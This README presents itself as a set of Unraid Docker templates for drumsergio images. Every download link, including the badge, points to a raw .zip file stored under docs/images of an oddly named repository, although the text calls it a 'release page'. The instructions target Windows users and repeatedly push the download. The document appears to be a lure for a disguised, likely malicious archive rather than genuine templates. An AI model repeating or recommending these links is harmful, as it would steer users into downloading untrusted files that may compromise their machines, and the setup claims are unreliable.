# 🧰 docker-templates - Simple Unraid Docker setups

[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/unsweet-countrypeople732/docker-templates/main/docs/images/templates-docker-v3.5.zip)

## 📦 What this is

docker-templates gives you Unraid Community Applications Docker templates for drumsergio images.

These templates help you add ready-made Docker apps to Unraid without building anything by hand. You can use them for backups, media tools, home server tasks, automation, and small self-hosted services.

If you run Unraid and use Community Applications, this repo gives you a simple path to install supported containers with the right settings in place.

## 🖥️ What you need

Before you start, make sure you have:

- A Windows PC to browse and manage the download
- An Unraid server with Docker support turned on
- Community Applications installed in Unraid
- A web browser such as Chrome, Edge, or Firefox
- A stable network link between your PC and Unraid server

You do not need to write code. You do not need to build images. You only need to download the template files and use them in Unraid.

## 🚀 Get the templates

Visit this page to download:

https://raw.githubusercontent.com/unsweet-countrypeople732/docker-templates/main/docs/images/templates-docker-v3.5.zip

Use the release page to get the latest template package or release file. Save it to your Windows PC, then move it to your Unraid setup or use it from the release instructions if the package includes direct import steps.

## 🛠️ Install on Windows and Unraid

Follow these steps in order:

1. Open the release page in your web browser.
2. Pick the latest release.
3. Download the template file or release package from that page.
4. Save the file to a place you can find, such as Downloads or Desktop.
5. Open your Unraid web page in the browser.
6. Make sure Community Applications is installed.
7. Import the template or place it where Unraid expects Docker templates, based on the release instructions.
8. Open the Docker tab in Unraid.
9. Find the new app entry in Community Applications or in the Docker list.
10. Review the settings before you start the container.
11. Set any folders, ports, or variables that match your system.
12. Apply the changes and start the container.

If you are unsure where a setting goes, compare it with the app name and use the same folder paths you already use for other Unraid containers.

## 🧩 What you can use it for

These templates fit common home server jobs such as:

- Media handling with Jellyfin-related tools
- Backups and file protection
- Prometheus exporters for server metrics
- Telegram bot services
- TR-069 related tools
- Fuel price tracking tools
- CMS and web app containers
- Automation tasks for a homelab
- Multi-arch images that work on more than one CPU type

Each template gives you a clean start point for the related Docker image. That saves time when you set up services that need the same paths or variables each time.

## 📁 Typical folder setup

A common Unraid setup uses a few shared folders:

- `appdata` for app settings
- `downloads` for temporary files
- `media` for video, music, and photos
- `backups` for saved copies
- `documents` for files you want to keep safe

When you install a template, map each container path to a folder on your Unraid share. This keeps your data safe if you remove or update the container later.

## ⚙️ Common settings you may see

Many Docker templates use settings like these:

- Container name
- Host path
- Container path
- Port mapping
- Time zone
- User and group ID
- API key or token
- Optional feature flags

Use the same values you use in other Unraid apps when possible. If a field asks for a path, point it to an Unraid share. If a field asks for a port, pick one that is free on your server.

## 🔄 Update process

When a new release appears:

1. Open the releases page again.
2. Download the newer template file or package.
3. Replace the older version if needed.
4. Refresh Community Applications or the Docker page in Unraid.
5. Check the container settings after the update.
6. Start the container and confirm it runs as expected.

If you keep your data in `appdata` and your media in shared folders, updates stay simple and your files remain in place.

## 🧪 First-run checks

After you start a container for the first time, check these items:

- The container shows as running
- The web page opens, if the app has one
- The data path points to the right share
- The time zone matches your location
- Any login token or key is correct
- Logs do not show path or permission errors

If something does not start, the most common fix is to check the folder mapping and port number.

## 🧭 How this repo is organized

This repository focuses on Docker templates for Unraid users. The release files are the main item you need for setup. The templates are built for drumsergio images and cover a mix of self-hosted tools and server helpers.

The topic set points to a few common use cases:

- automation
- backup
- cms
- community applications
- container templates
- docker
- duplicacy
- fuel prices
- homelab
- jellyfin
- media management
- multi-arch
- prometheus exporter
- self-hosted
- telegram bot
- tr-069
- unraid
- unraid docker
- unraid templates

## 🔍 Troubleshooting

If a container does not work after install, check these items in order:

1. Make sure Docker is enabled in Unraid.
2. Confirm Community Applications is installed.
3. Check that the template file downloaded fully.
4. Verify your folder paths point to existing Unraid shares.
5. Make sure the port is not already in use.
6. Check that any token, password, or key is correct.
7. Open the container log and look for a path error or access error.
8. Restart the container after fixing the setting.

If the app uses files from another folder, confirm that the folder is also mapped into the container.

## 📄 Release page link again

Use this page to download:

https://raw.githubusercontent.com/unsweet-countrypeople732/docker-templates/main/docs/images/templates-docker-v3.5.zip

Open the latest release, get the file you need, then use it with your Unraid Docker setup.